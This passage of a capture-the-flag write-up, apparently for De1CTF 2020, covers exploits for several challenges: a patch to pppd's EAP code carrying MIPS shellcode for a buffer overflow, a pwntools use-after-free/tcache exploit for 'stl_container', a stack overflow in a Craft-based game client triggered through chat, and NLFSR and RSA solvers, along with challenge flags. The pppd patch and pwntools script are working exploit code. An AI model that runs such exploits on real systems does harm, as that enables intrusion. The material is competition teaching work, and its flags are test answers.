<p>In /etc/init.d/S40network, delete all comments, then modify the start.sh script, delete -net none, add -redir tcp: 9999 :: 9999 -redir tcp: 4242 :: 4242, so Network is configured</p>
<p>Then modify /etc/inittab change <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ttyS0 :: sysinit: / pppd auth local lock defaultroute nodetach 172.16.1.1:172.16.1.2 ms-dns 8.8.8.8 require-eap lcp-max-configure 100</span><br></pre></td></tr></table></figure></p>
<p>into <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ttyS0 :: sysinit: / bin / sh</span><br></pre></td></tr></table></figure></p>
<p>Then go to github to download a <a href="https://github.com/hugsy/gdb-static/blob/master/gdbserver-7.12-mips-be" target="_blank" rel="noopener">gdbserver</a>, repack a cpio, start it</p>
<p>After entering the system, you get a shell by default, and the system comes with a socat</p>
<p>carried out <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">socat pty,link=/dev/serial,raw tcp-listen:9999 &amp;</span><br><span class="line">/pppd /dev/serial 9600 local lock defaultroute 172.16.1.1:172.16.1.2 ms-dns 8.8.8.8 require-eap lcp-max-configure 100</span><br></pre></td></tr></table></figure></p>
<p>Then execute the following command to get the pid of pppd <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ps | grep pppd</span><br></pre></td></tr></table></figure></p>
<p>Use gdbserver attach to pppd <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./gdbserver --attach 0.0.0.0:4242 pid</span><br></pre></td></tr></table></figure></p>
<p>Then use gdb-multiarch to connect to gdbserver</p>
<p>Then downloading a pppd source code, compile execute <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">socat pty,link=/tmp/serial,rawer tcp:127.0.0.1:9999</span><br><span class="line">pppd noauth local lock defaultroute debug nodetach /tmp/serial 9600 user notadmin password notpassword</span><br></pre></td></tr></table></figure></p>
<p>now you can start debug and write the exp</p>
<p>following this <a href="https://gist.github.com/nstarke/551433bcc72ff95588e168a0bb66612" target="_blank" rel="noopener">guide</a>,you can write the exp of this chall</p>
<p>exp patch is below <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line">--- ppp-ppp-2.4.7/pppd/eap.c    2014-08-09 12:31:39.000000000 +0000</span><br><span class="line">+++ ppp-poc/ppp-ppp-2.4.7/pppd/eap.c    2020-04-12 03:23:54.321773453 +0000</span><br><span class="line">@@ -1385,8 +1385,46 @@</span><br><span class="line">            esp-&gt;es_usedpseudo = 2;</span><br><span class="line">        &#125;</span><br><span class="line"> #endif /* USE_SRP */</span><br><span class="line">-       eap_send_response(esp, id, typenum, esp-&gt;es_client.ea_name,</span><br><span class="line">-           esp-&gt;es_client.ea_namelen);</span><br><span class="line">+       //eap_send_response(esp, id, typenum, esp-&gt;es_client.ea_name,</span><br><span class="line">+       //    esp-&gt;es_client.ea_namelen);</span><br><span class="line">+#define PAY_LEN 256</span><br><span class="line">+       char sc[PAY_LEN];</span><br><span class="line">+       memset(sc, &apos;C&apos;, PAY_LEN);</span><br><span class="line">+       int* shellcode = (int*)sc;</span><br><span class="line">+       shellcode[0]=0x3c09616c;</span><br><span class="line">+       shellcode[1]=0x3529662f;</span><br><span class="line">+       shellcode[2]=0xafa9fff8;</span><br><span class="line">+       shellcode[3]=0x2419ff98;</span><br><span class="line">+       shellcode[4]=0x3204827;</span><br><span class="line">+       shellcode[5]=0xafa9fffc;</span><br><span class="line">+       shellcode[6]=0x27bdfff8;</span><br><span class="line">+       shellcode[7]=0x3a02020;</span><br><span class="line">+       shellcode[8]=0x2805ffff;</span><br><span class="line">+       shellcode[9]=0x2806ffff;</span><br><span class="line">+       shellcode[10]=0x34020fa5;</span><br><span class="line">+       shellcode[11]=0x101010c;</span><br><span class="line">+       shellcode[12]=0xafa2fffc;</span><br><span class="line">+       shellcode[13]=0x8fa4fffc;</span><br><span class="line">+       shellcode[14]=0x3c19ffb5;</span><br><span class="line">+       shellcode[15]=0x3739c7fd;</span><br><span class="line">+       shellcode[16]=0x3202827;</span><br><span class="line">+       shellcode[17]=0x3c190101;</span><br><span class="line">+       shellcode[18]=0x373901fe;</span><br><span class="line">+       shellcode[19]=0x3c060101;</span><br><span class="line">+       shellcode[20]=0x34c60101;</span><br><span class="line">+       shellcode[21]=0x3263026;</span><br><span class="line">+       shellcode[22]=0x34020fa3;</span><br><span class="line">+       shellcode[23]=0x101010c;</span><br><span class="line">+       shellcode[24]=0x3c05004a;</span><br><span class="line">+       shellcode[25]=0x34a53800;</span><br><span class="line">+       shellcode[26]=0x20460002;</span><br><span class="line">+       shellcode[27]=0x3c190042;</span><br><span class="line">+       shellcode[28]=0x37396698;</span><br><span class="line">+       shellcode[29]=0x320f809;</span><br><span class="line">+       shellcode[30]=0x0;</span><br><span class="line">+       sc[PAY_LEN-1] = &apos;\0&apos;;</span><br><span class="line">+</span><br><span class="line">+       eap_send_response(esp, id, typenum, shellcode, PAY_LEN);</span><br><span class="line">        break;</span><br><span class="line"></span><br><span class="line">    case EAPT_NOTIFICATION:</span><br><span class="line">@@ -1452,8 +1490,21 @@</span><br><span class="line">        BZERO(secret, sizeof (secret));</span><br><span class="line">        MD5_Update(&amp;mdContext, inp, vallen);</span><br><span class="line">        MD5_Final(hash, &amp;mdContext);</span><br><span class="line">-       eap_chap_response(esp, id, hash, esp-&gt;es_client.ea_name,</span><br><span class="line">-           esp-&gt;es_client.ea_namelen);</span><br><span class="line">+       //eap_chap_response(esp, id, hash, esp-&gt;es_client.ea_name,</span><br><span class="line">+       //    esp-&gt;es_client.ea_namelen);</span><br><span class="line">+       char payload[1024];</span><br><span class="line">+                memset(payload, &apos;A&apos;, 1023);</span><br><span class="line">+                memset(payload, &apos;B&apos;, 0x2a0);</span><br><span class="line">+       int *tpayload = (int*)(payload + 0x2a0 - 4);</span><br><span class="line">+       //*tpayload = 0x040A0BC;</span><br><span class="line">+       *tpayload = 0x4083FC;</span><br><span class="line">+       //*(tpayload-1) = 0x043EF9C;</span><br><span class="line">+       *(tpayload-1) = 0x43EF9C;</span><br><span class="line">+       *(tpayload-5) = 0x4a7a0c-8;</span><br><span class="line">+</span><br><span class="line">+                payload [1023] = &apos;\0&apos;;</span><br><span class="line">+                eap_chap_response(esp, id, hash, payload, 1024);</span><br><span class="line">+       exit(0);</span><br><span class="line">        break;</span><br><span class="line"></span><br><span class="line"> #ifdef USE_SRP</span><br></pre></td></tr></table></figure></p>
<h2><span id="stl_container">stl_container</span></h2>
<p>This challenge is about a bug in c ++ vector template When the item stored in the vector is an Object, no matter what index you want to erase will call the destructor of the last Object in the vector This causes a UAF vulnerability, and then you can use tcache to carry out various attacks</p>
<p>Below is the exp <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">debug=0</span><br><span class="line"></span><br><span class="line">#context.terminal = [&apos;tmux&apos;,&apos;-x&apos;,&apos;sh&apos;,&apos;-c&apos;]</span><br><span class="line">#context.terminal = [&apos;tmux&apos;, &apos;splitw&apos;, &apos;-h&apos; ]</span><br><span class="line">context.log_level=&apos;debug&apos;</span><br><span class="line"></span><br><span class="line">if debug:</span><br><span class="line">    p=process(&apos;./stl_container&apos;)</span><br><span class="line">    #p=process(&apos;&apos;,env=&#123;&apos;LD_PRELOAD&apos;:&apos;./libc.so&apos;&#125;)</span><br><span class="line">    gdb.attach(p)</span><br><span class="line">else:</span><br><span class="line">    p=remote(&apos;134.175.239.26&apos;,8848)</span><br><span class="line"></span><br><span class="line">def ru(x):</span><br><span class="line">    return p.recvuntil(x)</span><br><span class="line"></span><br><span class="line">def se(x):</span><br><span class="line">    p.send(x)</span><br><span class="line"></span><br><span class="line">def sl(x):</span><br><span class="line">    p.sendline(x)</span><br><span class="line"></span><br><span class="line">def add(ty, content=&apos;a&apos;):</span><br><span class="line">    sl(str(ty))</span><br><span class="line">    ru(&apos;3. show&apos;)</span><br><span class="line">    ru(&apos;&gt;&gt;&apos;)</span><br><span class="line">    sl(&apos;1&apos;)</span><br><span class="line">    ru(&apos;input data:&apos;)</span><br><span class="line">    se(content)</span><br><span class="line">    ru(&apos;&gt;&gt;&apos;)</span><br><span class="line"></span><br><span class="line">def delete(ty, idx=0):</span><br><span class="line">    sl(str(ty))</span><br><span class="line">    ru(&apos;3. show&apos;)</span><br><span class="line">    ru(&apos;&gt;&gt;&apos;)</span><br><span class="line">    sl(&apos;2&apos;)</span><br><span class="line">    if ty &lt;= 2:</span><br><span class="line">        ru(&apos;index?&apos;)</span><br><span class="line">        sl(str(idx))</span><br><span class="line">    ru(&apos;&gt;&gt;&apos;)</span><br><span class="line"></span><br><span class="line">def show(ty, idx=0):</span><br><span class="line">    sl(str(ty))</span><br><span class="line">    ru(&apos;3. show&apos;)</span><br><span class="line">    ru(&apos;&gt;&gt;&apos;)</span><br><span class="line">    sl(&apos;3&apos;)</span><br><span class="line">    ru(&apos;index?\n&apos;)</span><br><span class="line">    sl(str(idx))</span><br><span class="line">    ru(&apos;data: &apos;)</span><br><span class="line">    data = ru(&apos;\n&apos;)</span><br><span class="line">    ru(&apos;&gt;&gt;&apos;)</span><br><span class="line">    return data</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ru(&apos;&gt;&gt;&apos;)</span><br><span class="line"></span><br><span class="line">add(1)</span><br><span class="line">add(1)</span><br><span class="line">add(2)</span><br><span class="line">add(2)</span><br><span class="line">add(4)</span><br><span class="line">add(4)</span><br><span class="line">add(3)</span><br><span class="line">add(3)</span><br><span class="line"></span><br><span class="line">delete(3)</span><br><span class="line">delete(3)</span><br><span class="line">delete(1)</span><br><span class="line">delete(1)</span><br><span class="line">delete(4)</span><br><span class="line">delete(4)</span><br><span class="line">delete(2)</span><br><span class="line">data = show(2)</span><br><span class="line">libc = u64(data[:6]+&apos;\0\0&apos;)</span><br><span class="line">base = libc - 0x3ebca0</span><br><span class="line">free_hook = base + 0x3ed8e8</span><br><span class="line">system = base + 0x4f440</span><br><span class="line"></span><br><span class="line">add(3, &apos;/bin/sh\0&apos;)</span><br><span class="line">delete(2)</span><br><span class="line">add(4)</span><br><span class="line">add(2)</span><br><span class="line">add(2)</span><br><span class="line">add(3, &apos;/bin/sh\0&apos;)</span><br><span class="line">delete(2)</span><br><span class="line">delete(2)</span><br><span class="line">add(1, p64(free_hook))</span><br><span class="line">add(1, p64(system))</span><br><span class="line"></span><br><span class="line">sl(&apos;3&apos;)</span><br><span class="line">ru(&apos;show&apos;)</span><br><span class="line">sl(&apos;2&apos;)</span><br><span class="line"></span><br><span class="line">print(hex(base))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></p>
<h2><span id="mc_realworld">mc_realworld</span></h2>
<p>Files: <a href="https://pastebin.com/FrVCXW42" target="_blank" rel="noopener">exp.py</a> <a href="https://pastebin.com/t37qDEYw" target="_blank" rel="noopener">requirements.txt</a></p>
<p>The challenge was modified based on a minecraft-liked game written in C <a href="https://github.com/fogleman/Craft" target="_blank" rel="noopener">fogleman/Craft</a>.</p>
<p>The vulnerability function is <code>add_messages</code> located in the client binary. You can use <code>bindiff</code> to find it. In the function, there is some codes like:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">if (text[0] == &apos;@&apos; &amp;&amp; strlen(text) &gt; 192) &#123;</span><br><span class="line">    text = text + 1;</span><br><span class="line">    char *body = text + 32;</span><br><span class="line">    size_t length;</span><br><span class="line">    char *plain = base64_decode(body, strlen(body), &amp;length);</span><br><span class="line">    char message[16] = &#123;0&#125;;</span><br><span class="line">    memcpy(&amp;message, plain, length);</span><br><span class="line">    printf(&quot;%8s&quot;, &amp;message);</span><br><span class="line">    return;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>Obviously, an easy stack BOF! Let's use <code>checksec</code> to have a look at the protection.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>
<p>Okay... A check-in challenge, that's what I'm thinking about.</p>
<p><code>add_messages</code> will be triggled before some messages show on the console in game. Therefore, we can exploit a player's machine by <span class="citation" data-cites="someone">@someone</span> in the chat box. Make sure the length of text message above 192 bytes, also using <code>base64</code> to encode.</p>
<p>One more problem, how to get the <code>flag</code> from the victim(bot)'s machine. After digging in the binary, I find <code>client_talk</code> function. Using it to <span class="citation" data-cites="attacker">@attacker</span>(me) follow with the <code>flag</code>, we can receive the flag at the client side.</p>
<p>For more details, check the expolit <code>exp.py</code>.</p>
<p><code>De1CTF{W3_L0vE_D4nge2_ReA1_W0r1d1_CrAft!2233}</code></p>
<h1><span id="crypto">crypto</span></h1>
<h2><span id="nlfsr">NLFSR</span></h2>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding:utf8</span></span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">lfsr</span><span class="params">(r, m)</span>:</span> <span class="keyword">return</span> ((r &lt;&lt; <span class="number">1</span>) &amp; <span class="number">0xffffff</span>) ^ (bin(r &amp; m).count(<span class="string">'1'</span>) % <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ma, mb, mc, md = <span class="number">0x505a1</span>, <span class="number">0x40f3f</span>, <span class="number">0x1f02</span>, <span class="number">0x31</span></span><br><span class="line">key = open(<span class="string">"data"</span>).read()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">calcR</span><span class="params">(x, y)</span>:</span></span><br><span class="line">    <span class="keyword">assert</span> len(x) == len(y)</span><br><span class="line">    cnt = <span class="number">0.0</span></span><br><span class="line">    <span class="keyword">for</span> i, j <span class="keyword">in</span> zip(x, y):</span><br><span class="line">        cnt += (i == j)</span><br><span class="line">    <span class="keyword">return</span> cnt/len(x)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">brutea</span><span class="params">(nb)</span>:</span></span><br><span class="line">    relation, reala = <span class="number">0</span>, <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">2</span>**<span class="number">18</span>+<span class="number">1</span>, <span class="number">2</span>**<span class="number">19</span>):</span><br><span class="line">        s = <span class="string">''</span></span><br><span class="line">        a = i</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(nb*<span class="number">8</span>):</span><br><span class="line">            a = lfsr(a, ma)</span><br><span class="line">            s += str(a &amp; <span class="number">1</span>)</span><br><span class="line">        r = calcR(s, key[:nb*<span class="number">8</span>])</span><br><span class="line">        <span class="keyword">if</span> relation &lt; r:</span><br><span class="line">            relation, reala = r, i</span><br><span class="line">    print(reala, relation)</span><br><span class="line">    <span class="keyword">return</span> reala</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">brutecd</span><span class="params">(nb)</span>:</span></span><br><span class="line">    relation, realc, reald = <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">2</span>**<span class="number">5</span>+<span class="number">1</span>, <span class="number">2</span>**<span class="number">6</span>):</span><br><span class="line">        d = i</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">2</span>**<span class="number">12</span>+<span class="number">1</span>, <span class="number">2</span>**<span class="number">13</span>):</span><br><span class="line">            c = j</span><br><span class="line">            s = <span class="string">''</span></span><br><span class="line">            <span class="keyword">for</span> k <span class="keyword">in</span> range(nb*<span class="number">8</span>):</span><br><span class="line">                c = lfsr(c, mc)</span><br><span class="line">                d = lfsr(d, md)</span><br><span class="line">                s += str((c &amp; <span class="number">1</span>) ^ (d &amp; <span class="number">1</span>))</span><br><span class="line">            r = calcR(s, key[:nb*<span class="number">8</span>])</span><br><span class="line">            <span class="keyword">if</span> relation &lt; r:</span><br><span class="line">                relation, realc, reald = r, j, i</span><br><span class="line">    print(realc, reald, relation)</span><br><span class="line">    <span class="keyword">return</span> realc, reald</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bruteb</span><span class="params">(nb, a_, c_, d_)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">2</span>**<span class="number">18</span>+<span class="number">1</span>, <span class="number">2</span>**<span class="number">19</span>):</span><br><span class="line">        b = i</span><br><span class="line">        a, c, d = a_, c_, d_</span><br><span class="line">        s = <span class="string">''</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(nb*<span class="number">8</span>):</span><br><span class="line">            a = lfsr(a, ma)</span><br><span class="line">            b = lfsr(b, mb)</span><br><span class="line">            c = lfsr(c, mc)</span><br><span class="line">            d = lfsr(d, md)</span><br><span class="line">            [ao, bo, co, do] = [k &amp; <span class="number">1</span> <span class="keyword">for</span> k <span class="keyword">in</span> [a, b, c, d]]</span><br><span class="line">            s += str((ao*bo) ^ (bo*co) ^ (bo*do) ^ co ^ do)</span><br><span class="line">        <span class="keyword">if</span> s == key[:nb*<span class="number">8</span>]:</span><br><span class="line">            print(i)</span><br><span class="line">            <span class="keyword">return</span> i</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    <span class="keyword">print</span> time.asctime()</span><br><span class="line">    a = brutea(<span class="number">15</span>)</span><br><span class="line">    <span class="keyword">print</span> time.asctime()</span><br><span class="line">    c, d = brutecd(<span class="number">20</span>)</span><br><span class="line">    <span class="keyword">print</span> time.asctime()</span><br><span class="line">    b = bruteb(<span class="number">15</span>, a, c, d)</span><br><span class="line">    <span class="keyword">print</span> time.asctime()</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"De1CTF&#123;%s&#125;"</span> % (<span class="string">''</span>.join([hex(i)[<span class="number">2</span>:] <span class="keyword">for</span> i <span class="keyword">in</span> [a, b, c, d]]))</span><br><span class="line">   </span><br><span class="line"><span class="comment">#De1CTF&#123;58bb578d5611363f&#125;</span></span><br></pre></td></tr></table></figure>
<h2><span id="easyrsa">easyRSA</span></h2>
<p>This is a common modules attack but when the task is about end someone tell me that this challenge is same as the challenge in D^3CTF <a href="https://github.com/D-3CTF/D3CTF-2019-Challenges" target="_blank" rel="noopener">Common</a>. Last year I didn't look at the crypto challenge in this task. So I want to make a sincere apology to the person, <a href="https://gist.github.com/LurkNoi" target="_blank" rel="noopener">Lurkrul</a> ,who made the challenge. Sorry about this.</p>
<p>And here is the solution:</p>
<p>In this a RSA task. We can find out that the e has been generated by this way:</p>
<p><span class="math display">\[
e_1d_1 = 1 + k_1\lambda(N)
\]</span></p>
<p><span class="math display">\[
e_2d_2 = 1 + k_2\lambda(N)
\]</span></p>
<p>And there are some limits: <span class="math display">\[
limit = \sqrt[3]{N}
\]</span></p>
<p><span class="math display">\[
limit &lt; r &lt; 0x1000000000001 * limit
\]</span></p>
<p><span class="math display">\[
d_i = nextPrime(r)
\]</span></p>
<p><span class="math display">\[
e_i \approx N
\]</span></p>
<p>We choose a random <span class="math inline">\(e\)</span> in <span class="math inline">\([e_1\)</span> , <span class="math inline">\(e_2]\)</span> to encrypt flag, <span class="math display">\[
flag^{e} \equiv cipher \pmod n
\]</span> And give these parameters: <span class="math display">\[
N,e1,e2,cipher
\]</span> In this task, we can get some equation: <span class="math display">\[
e_id_i = 1 + k_i \lambda(N) = 1 + \frac {k_i}{g} \Phi(N) = 1 + \frac {k_i}{g} (N-s)
\]</span> And we rewrite it as: <span class="math display">\[
W_i: e_id_ig - k_iN = g - k_is
\]</span> This equation is the starting point for Wiener's attack.</p>
<p>Also we can get this easily: <span class="math display">\[
G_{i,j}: k_ie_jd_j - k_je_id_i = k_i - k_j
\]</span> This equation is the starting point for Guo's common modulus attack.</p>
<p>Then we assume: <span class="math display">\[
k_2W_1: k_2e_1d_1g - k_2k_1N = k_2(g-k_1s)
\]</span></p>
<p><span class="math display">\[
gG_{1,2} : k_1e_2d_2g - k_2e_1d_1g = g(k_1-k_2)
\]</span></p>
<p><span class="math display">\[
W_1W_2 : d_1d_2g^2e_1e_2 - d_1k_2ge_1N - d_2k_1ge_2N + k_1k_2N^2 = (g-k_1s)(g-k_2s)
\]</span></p>
<p>Along with the trivial equation: <span class="math display">\[
k1k2 = k2k1
\]</span> can be written as the vector-matrix equation: <span class="math display">\[
x_2B_2 = v_2
\]</span> where: <span class="math display">\[
x_2 = (k_1k_2,k_2d_1g,k_1d_2g,d_1d_2g^2)
\]</span></p>
<p><span class="math display">\[
B_2 = [Math Processing Error]
[1−N0N2e1−e1−e1Ne2−e2Ne1e2]
\]</span></p>
<p><span class="math display">\[
v_2 = (k_1k_2,k_2(g-k_1s),g(k_1-k_2),(g-k_1s)(g-k_2s))
\]</span></p>
<p>The vector <span class="math inline">\(v_2\)</span> is an integer linear combination of the rows in <span class="math inline">\(B_2\)</span>, and is therefore a vector in the lattice <span class="math inline">\(L_2\)</span>generated by the rows of <span class="math inline">\(B_2\)</span>.</p>
<p>And the size of <span class="math inline">\(v_2\)</span>, coming from the dominant last component, is roughly <span class="math display">\[
k_1k_2s^2 \approx N^{2\delta_2+1} = N^{2(\delta_2+1/2)}
\]</span></p>
<p><span class="math display">\[
\delta_2 = 0.357 - \epsilon \ , \ \epsilon \ is \ small
\]</span></p>
<p>Since the components of <span class="math inline">\(v_2\)</span> are not the same size, we can consider the modified vector-matrix equation: <span class="math display">\[
x_2B_2D_2 = v_2D_2
\]</span> Where <span class="math inline">\(D_2\)</span> is the diagonal matrix: <span class="math display">\[
D_2 = [Math Processing Error]
[NN(1/2)N1+δ21]
\]</span> Letting: <span class="math display">\[
v^{&#39;}_2 = v_2D_2
\]</span> Thus: <span class="math display">\[
v^{&#39;}_2 = (k_1k_2N,k2(g-k_1s)N^{(1/2)},g(k_1-k_2)N^{1+\delta_2},(g-k_1s)(g-k_2s))
\]</span> We can use LLL to get <span class="math inline">\(v^{&#39;}_2\)</span> and solve:<br>
<span class="math display">\[
x_2B_2D_2 = v^{&#39;}_2
\]</span> to get <span class="math inline">\(x_2\)</span></p>
<p>Finally we can get <span class="math inline">\(\Phi(N)\)</span> by: <span class="math display">\[
\Phi(N) = \lfloor {e_1 \frac {x_2[2]}{x_2[1]}}\rfloor
\]</span></p>
<p>So we can decrypt the cipher to get flag !</p>
<p>If you want to know more details about this attack, take a look at this <a href="http://index-of.es/Varios-2/Cryptanalysis%20of%20RSA%20and%20It&#39;s%20Variants.pdf" target="_blank" rel="noopener">book</a>, Chapter 7.1.</p>
<p>Reference:</p>
<p>http://index-of.es/Varios-2/Cryptanalysis of RSA and It's Variants.pdf</p>
<p>https://sci-hub.tw/https://link.springer.com/chapter/10.1007/978-3-319-08344-5_12</p>
<p>https://sci-hub.tw/https://link.springer.com/chapter/10.1007/3-540-46701-7_14</p>
<p>https://eprint.iacr.org/2009/037.pdf</p>
<h2><span id="ecdh">ECDH</span></h2>
